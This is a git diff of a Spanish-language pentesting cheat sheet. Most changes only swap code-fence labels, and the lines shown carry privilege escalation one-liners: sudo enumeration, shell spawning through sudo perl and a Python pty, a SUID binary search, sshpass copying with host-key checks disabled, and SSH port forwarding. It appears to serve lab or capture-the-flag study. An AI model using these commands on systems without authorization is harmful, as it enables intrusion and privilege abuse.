@@ -11,51 +11,51 @@ comments: true
 
 #### Sudo 
 
-```vim
+```Python
 sudo -l
 ```
 
-```vim
+```Python
 sudo -u USER /bin/bash
 ```
 
-```vim
+```Python
 sudo -u USER commandLine /dir/file
 ```
 #### Net
-```vim
+```Python
 sockstat -4 -l 
 ```
-```vim
+```Python
 netstat -anp tcp | grep -i listen
 ```
 #### DNS
 
-```vim
+```Python
 echo "Mensaje" | sudo tee -a /dir/archivo 
 ```
-```vim
+```Python
 echo “Mensaje” > /dir/archivo
 ```
 
 #### Echo
-```vim
+```Python
 echo “Reverse shell” > /dir/file
 ```
 #### Perl
 
-```vim
+```Python
 sudo perl -e 'exec "/bin/sh";
 ```
 #### SSH
 
 **El punto tambien va del final.**
-```vim
+```Python
 sshpass -p 'passwordOfUser' scp -oStrictHostKeyChecking=no User@IP:File .
 ```
 
 **Port Forwarding Desde mi maquina**
-```vim
+```Python
 ssh -L port:127.0.0.1:port -N -f -l userSSH IP 
 ```
 #### Python
@@ -68,7 +68,7 @@ python3 -c "import pty;pty.spawn('/bin/bash')"
 python2 -m SimpleHTTPServer 4567
 ```
 #### Binaries
-```vim
+```Python
 find / perm -u=s -type f 2>/dev/null
 ```
 ## Windows
@@ -93,7 +93,7 @@ find / perm -u=s -type f 2>/dev/null
 
 > [Windows Privilege Escalation Fundamentals](http://www.fuzzysecurity.com/tutorials/16.html)
 
->
+> []()
 
 ## Herramientas
 > [PsPy](https://github.com/DominicBreuker/pspy) 
